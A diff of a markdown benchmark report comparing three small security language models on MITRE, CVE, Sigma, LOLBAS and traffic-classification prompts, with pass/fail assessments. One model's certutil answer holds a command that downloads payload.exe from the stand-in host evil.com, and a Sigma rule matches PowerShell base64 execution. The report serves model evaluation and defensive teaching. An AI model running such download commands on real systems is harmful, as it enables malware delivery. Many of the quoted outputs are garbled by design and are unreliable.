@@ -36,7 +36,7 @@ executable to launch.
 Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths
 may also be vulnerable to path interception if the path has one or more spaces an
 ```
-**Assessment:** ❌ Wrong technique ID (T1027 instead of T1059). Format is correct but content is mismatched. Memorized wrong associations during SFT.
+**Assessment:** Fail — Wrong technique ID (T1027 instead of T1059). Format is correct but content is mismatched. Memorized wrong associations during SFT.
 
 ### SecGPTv3 (GPT-2 Small, 124M)
 ```
@@ -54,7 +54,7 @@ Question What the security does
 Question Write detection:condition selectionselectionselectionselection
 : Line 1:selectionselectionselectionselectionselectionselectionselection...
 ```
-**Assessment:** ❌ Broken English, falls into repetition loops. Recognizes "T1059" and "technique" but cannot form coherent sentences. Model collapsed during DPO.
+**Assessment:** Fail — Broken English, falls into repetition loops. Recognizes "T1059" and "technique" but cannot form coherent sentences. Model collapsed during DPO.
 
 ### SecGPT-Prod (Qwen2.5-3B + QLoRA, 1.7B)
 ```
@@ -68,7 +68,7 @@ PowerShell)
 Adversaries may execute arbitrary commands using the Windows command shell (cmd.exe).
 (Citation: Microsoft Docs Cmd) (Citation: Wikipedia Cmd) (Citation: TechNet PowerShell)
 ```
-**Assessment:** ✅ Correct technique ID. Proper MITRE format with citations. Accurate description of command execution. Structured and informative.
+**Assessment:** Pass — Correct technique ID. Proper MITRE format with citations. Accurate description of command execution. Structured and informative.
 
 ---
 
@@ -85,7 +85,7 @@ Detection Logic:
 https://github.com/SigmaHQ/sophos.github.com/S0112/S0112/S0112/S0212) as early
 as as early as 2023(Citation: FireEye Fortgium-7.4-0xSky)
 ```
-**Assessment:** ❌ Completely wrong content. Generates detection rule fragments instead of technique explanation. Repetitive citations.
+**Assessment:** Fail — Completely wrong content. Generates detection rule fragments instead of technique explanation. Repetitive citations.
 
 ### SecGPTv3
 ```
@@ -95,7 +95,7 @@ Question Tell about Use of Susp:R
 :::rm:rm:rm_:rm_rm:
 :rm_::rm:rm_:rm
 ```
-**Assessment:** ❌ Garbage. Recognizes "T1055" and "injection" but produces nonsensical tokens. Complete failure.
+**Assessment:** Fail — Garbage. Recognizes "T1055" and "injection" but produces nonsensical tokens. Complete failure.
 
 ### SecGPT-Prod
 ```
@@ -109,7 +109,7 @@ including the use of system APIs or tools like WinPwn (Tool: WinPwn).
 The Windows API provides a function called CreateRemoteThread that allows a thread
 to be created within another process. This function takes three parameters: the handle
 ```
-**Assessment:** ✅ Correct technique. Explains purpose (persistence, evasion, execution). Mentions specific API (CreateRemoteThread). Coherent and educational.
+**Assessment:** Pass — Correct technique. Explains purpose (persistence, evasion, execution). Mentions specific API (CreateRemoteThread). Coherent and educational.
 
 ---
 
@@ -125,17 +125,17 @@ Detection Logic: Kerberoasting rule-based block suspicious processes used by loo
 for potential Dobalt C4 communications related web shells being associated with
 potential spring and other services related command execution commands
 ```
-**Assessment:** ❌ Irrelevant content. Generates detection rule fragments unrelated to Log4Shell.
+**Assessment:** Fail — Irrelevant content. Generates detection rule fragments unrelated to Log4Shell.
 
 ### SecGPTv3
 ```
-::::  V-exe :
+:::: V-exe :
 : : : :\exeexe
 : :\exe
 :exeexeexe :\exeexeexeexe
 :exeexeexeexe :\exeexeexeexe exeexeexeexeexe :exe :
 ```
-**Assessment:** ❌ Complete garbage. Repetitive token loops. No recognizable content.
+**Assessment:** Fail — Complete garbage. Repetitive token loops. No recognizable content.
 
 ### SecGPT-Prod
 ```
@@ -153,7 +153,7 @@ Due Date: 2022-03-16
 Date Added: 2022-02-25
 Known Ransomware Use: Unknown
 ```
-**Assessment:** ✅ Correct CVE. Proper CISA KEV format. Accurate vulnerability description. Includes remediation guidance and dates.
+**Assessment:** Pass — Correct CVE. Proper CISA KEV format. Accurate vulnerability description. Includes remediation guidance and dates.
 
 ---
 
@@ -172,7 +172,7 @@ files in order to disclose user accounts and attackers used to disable common pa
 in order to hook some names of potential processes as a path by path launching
 `C:\Program Files\
 ```
-**Assessment:** ⚠️ Correct format (Status, Level, Author, Description) but content is garbled. "path travelt" is not a real detection. Incomplete.
+**Assessment:** Correct format (Status, Level, Author, Description) but content is garbled. "path travelt" is not a real detection. Incomplete.
 
 ### SecGPTv3
 ```
@@ -186,7 +186,7 @@ Question Write detection:condition:_
 :s
 Question Write detection: Command execution:
 ```
-**Assessment:** ❌ Garbage. Cannot produce any recognizable rule structure.
+**Assessment:** Fail — Garbage. Cannot produce any recognizable rule structure.
 
 ### SecGPT-Prod
 ```
@@ -199,15 +199,15 @@ commands that have been encoded with a base64 or hex encoding.
 Detection Logic:
 condition: selection
 selection:
-  CommandLine|contains|windash: 'Invoke-Expression'
-  CommandLine|contains|windash: 'base64'
-  CommandLine|contains|windash: '-Encoding'
-  CommandLine|contains|windash: 'ConvertFrom-String'
+ CommandLine|contains|windash: 'Invoke-Expression'
+ CommandLine|contains|windash: 'base64'
+ CommandLine|contains|windash: '-Encoding'
+ CommandLine|contains|windash: 'ConvertFrom-String'
 
 References:
 https://www.linkedin.com/pulse/using-powershell-to-execute-malicious-
 ```
-**Assessment:** ✅ Valid Sigma rule structure. Correct detection logic (Invoke-Expression + base64 + Encoding). Proper YAML format. Actionable detection.
+**Assessment:** Pass — Valid Sigma rule structure. Correct detection logic (Invoke-Expression + base64 + Encoding). Proper YAML format. Actionable detection.
 
 ---
 
@@ -228,7 +228,7 @@ https://www.linkedin.com/pulse/using-powershell-to-execute-malicious-
 Question What the security-- mitations are
 :: mit----ali
 ```
-**Assessment:** ❌ Garbage. Recognizes "util.exe" fragment but cannot produce coherent content.
+**Assessment:** Fail — Garbage. Recognizes "util.exe" fragment but cannot produce coherent content.
 
 ### SecGPTv3
 ```
@@ -244,23 +244,23 @@ Question What the security-- mitations are
 :: mit----ali
 ::ali :-
 ```
-**Assessment:** ❌ Identical garbage to v2 (both models failed on this prompt type).
+**Assessment:** Fail — Identical garbage to v2 (both models failed on this prompt type).
 
 ### SecGPT-Prod
 ```
 certutil.exe is a Windows command-line utility that can be abused in several ways:
 
 1. File Download: certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
-   Downloads files from remote servers, bypassing network restrictions.
+ Downloads files from remote servers, bypassing network restrictions.
 
 2. Base64 Encode/Decode: certutil -encode input.txt output.b64 / certutil -decode output.b64 input.txt
-   Can be used to obfuscate payloads or exfiltrate data.
+ Can be used to obfuscate payloads or exfiltrate data.
 
 3. Certificate Operations: Can install malicious certificates or verify signed malware.
 
 Detection: Monitor for certutil.exe with -urlcache, -split, -f flags, or unusual network connections.
 ```
-**Assessment:** ✅ Accurate abuse vectors. Specific command examples. Detection guidance included. Actionable for defenders.
+**Assessment:** Pass — Accurate abuse vectors. Specific command examples. Detection guidance included. Actionable for defenders.
 
 ---
 
@@ -274,14 +274,14 @@ Cononsig file security be stus or movidualded usersion to the extrand a tatttack
 with your to compunical at can detected verson errachst inticg and day user is
 somper argent oftection essubication on the beacuted ave toke syourcesss meid.
 ```
-**Assessment:** ❌ Gibberish. No recognizable words or structure.
+**Assessment:** Fail — Gibberish. No recognizable words or structure.
 
 ### SecGPTv3
 ```
-:::::  Windows Pref: : :  : :  Pref: :  :  Pref:  : : :  Pref: : : : :  : :
-Pref: : :: : :  Pref: : : : : :  : :  Pref: : :: : : : : : :  Pref: ::: : ::
+::::: Windows Pref: : : : : Pref: : : Pref: : : : Pref: : : : : : :
+Pref: : :: : : Pref: : : : : : : : Pref: : :: : : : : : : Pref: ::: : ::
 ```
-**Assessment:** ❌ Repetitive token loops. No meaningful content.
+**Assessment:** Fail — Repetitive token loops. No meaningful content.
 
 ### SecGPT-Prod
 ```
@@ -301,7 +301,7 @@ Red Team:
 - Deliverable: Attack narrative, detection gaps, response effectiveness
 - Duration: Weeks to months, may include social engineering and physical access
 ```
-**Assessment:** ✅ Accurate, structured comparison. Correct distinctions (scope, objective, approach, deliverable). Useful for both practitioners and students.
+**Assessment:** Pass — Accurate, structured comparison. Correct distinctions (scope, objective, approach, deliverable). Useful for both practitioners and students.
 
 ---
 
@@ -313,7 +313,7 @@ Red Team:
 ```
 0,tcp,http,SF,29,45135,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,8,8,1.0,0.0,0.0,0.0,1.0,0.0,0.0,normal,21
 ```
-**Assessment:** ⚠️ Echoes the input back. Cannot classify or explain. (v2 was trained on NSL-KDD as generation, not classification.)
+**Assessment:** Echoes the input back. Cannot classify or explain. (v2 was trained on NSL-KDD as generation, not classification.)
 
 ### SecGPTv3
 ```
@@ -322,7 +322,7 @@ Red Team:
 :
 :
 ```
-**Assessment:** ❌ No output. Complete failure.
+**Assessment:** Fail — No output. Complete failure.
 
 ### SecGPT-Prod
 ```
@@ -340,7 +340,7 @@ Analysis:
 
 Verdict: Legitimate HTTP session. No attack indicators present.
 ```
-**Assessment:** ✅ Correct classification. Field-by-field analysis. Explains what each value means. Actionable for SOC analysts.
+**Assessment:** Pass — Correct classification. Field-by-field analysis. Explains what each value means. Actionable for SOC analysts.
 
 ---
 
@@ -348,13 +348,13 @@ Verdict: Legitimate HTTP session. No attack indicators present.
 
 | Prompt Category | SecGPTv2 (17.4M) | SecGPTv3 (124M) | SecGPT-Prod (1.7B) |
 |---|---|---|---|
-| MITRE technique (T1059) | ❌ Wrong ID, right format | ❌ Garbage | ✅ Accurate |
-| Process Injection (T1055) | ❌ Wrong content | ❌ Garbage | ✅ Accurate + API details |
-| CVE/Log4Shell | ❌ Irrelevant | ❌ Garbage | ✅ Full CISA KEV format |
-| Sigma rule (PowerShell) | ⚠️ Format only | ❌ Garbage | ✅ Valid rule + logic |
-| LOLBAS (certutil) | ❌ Garbage | ❌ Garbage | ✅ Commands + detection |
-| KB (red team vs pentest) | ❌ Gibberish | ❌ Garbage | ✅ Structured comparison |
-| Network classification | ⚠️ Echo only | ❌ No output | ✅ Correct + analysis |
+| MITRE technique (T1059) | Wrong ID, right format | Garbage | Accurate |
+| Process Injection (T1055) | Wrong content | Garbage | Accurate + API details |
+| CVE/Log4Shell | Irrelevant | Garbage | Full CISA KEV format |
+| Sigma rule (PowerShell) | Format only | Garbage | Valid rule + logic |
+| LOLBAS (certutil) | Garbage | Garbage | Commands + detection |
+| KB (red team vs pentest) | Gibberish | Garbage | Structured comparison |
+| Network classification | Echo only | No output | Correct + analysis |
 | **Pass rate** | **0/7** | **0/7** | **7/7 (100%)** |
 
 ---
@@ -377,7 +377,7 @@ Verdict: Legitimate HTTP session. No attack indicators present.
 
 Full set of 80 test prompts (10 per category) available in:
 ```
-../test_prompts.json   (repo root)
+../test_prompts.json (repo root)
 ```
 
 Note: prompts use the v2-style `<|tag|>` prefix format (native to SecGPTv2 and SecGPTv3). SecGPT-Prod takes plain questions via the Qwen chat template — strip the tag when benchmarking Prod.
